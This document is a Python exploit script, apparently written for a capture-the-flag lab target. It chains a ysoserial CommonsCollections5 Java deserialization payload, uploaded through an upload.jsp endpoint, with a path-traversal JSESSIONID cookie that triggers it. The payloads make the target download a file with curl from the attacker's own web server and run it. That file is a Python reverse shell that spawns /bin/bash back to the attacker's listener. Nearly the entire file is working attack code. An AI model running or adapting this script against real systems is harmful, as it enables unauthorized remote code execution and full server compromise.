#!/usr/bin/python3
import requests, os, socketserver, threading


# Change this for your variables
LHOST = "10.10.x.x"
LPORT = "9002"

RHOST = "10.10.10.x"
RPORT = "8080"

# Starting the code
server = None
shell_file = 'file.py'
SHELL = """import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")""".format(LHOST, LPORT)

# Start the webserver
def start_server(port = 80):
    global server
    print("[!] Opening the HTTP server")
    from http.server import HTTPServer, SimpleHTTPRequestHandler
    server = HTTPServer(('', port), SimpleHTTPRequestHandler)
    thread = threading.Thread(target = server.serve_forever)
    thread.daemon = True
    thread.start()
    print("[+] HTTP is up and running on port {}".format(server.server_port))

# Kill the server
def kill_server():
    global server
    server.shutdown()
    print("[-] Web server is now closed.")

# Create the payloads
def upload_payloads(cmd, name):
    print("[!] Tryig to upload the `{}` to the server".format(name))
    from subprocess import PIPE, run
    import base64   
    output = run(['java', '-jar', '/opt/tools/ysoserial.jar', 'CommonsCollections5', '{}'.format(cmd)], stdout=PIPE, stderr=PIPE).stdout
    files = {'image': ('{}.session'.format(name),output)}
    rsp = requests.post('http://{}:{}/upload.jsp?email=test@test.com'.format(RHOST, RPORT), files=files)
    if rsp.text.find('successfully', 0, -1) == -1 :
        print("[-] Upload failed for `{}`!".format(name))
        return False
    else:
        print("[+] Upload succeded for `{}`!".format(name))
        return True
    return None

# Trigger the uploaded payload
def trigger_exploit(name):
    cookie = {'JSESSIONID': '../../../../../../opt/samples/uploads/{}'.format(name)}
    rsp = requests.get('http://{}:{}/upload.jsp?email=test@test.com'.format(RHOST, RPORT), cookies=cookie)
    if rsp.status_code == 500:
        print("[+] Trigger for `{}` succeded!".format(name))
        return True
    else:
        print("[-] Trigger for `{}` failed!".format(name))
        return False
    return None

def create_shell(name):
    print("[!] Creating the shell file")
    f = open(name, 'w')
    f.write(SHELL)
    f.close()
    print("[+] File `{}` has been created!".format(name))
    
def delete_shell(name):
    print("[-] Cleaning the file `{}`".format(name))
    import os
    os.remove(name)

print("[!] Exploit is about to start! Note that you need to have a listener on port `{}` started!".format(LPORT))
start = 'n'
while start != 'y':
    print("[!] Please start your listener on port `{}`".format(LPORT))
    start = input("[?] Is your listener started (y/n): ")
print("[!] Exploit starting now...")

start_server()

if upload_payloads("curl http://{}/{} -o /tmp/{}".format(LHOST,shell_file,shell_file), 'shell') != True:
    print('[-] Exploit failed! Try again!')
    quit()
if upload_payloads("python3 /tmp/{}".format(shell_file), 'exploit') != True:
    print('[-] Exploit failed! Try again!')
    quit()
create_shell(shell_file)
if trigger_exploit('shell') != True:
    print('[-] Exploit failed! Try again!')
    quit()
if trigger_exploit('exploit') != True:
    print('[-] Exploit failed! Try again!')
    quit()
delete_shell(shell_file)
kill_server()

print("[!] Exploit finished! You should have a shell on your listener!")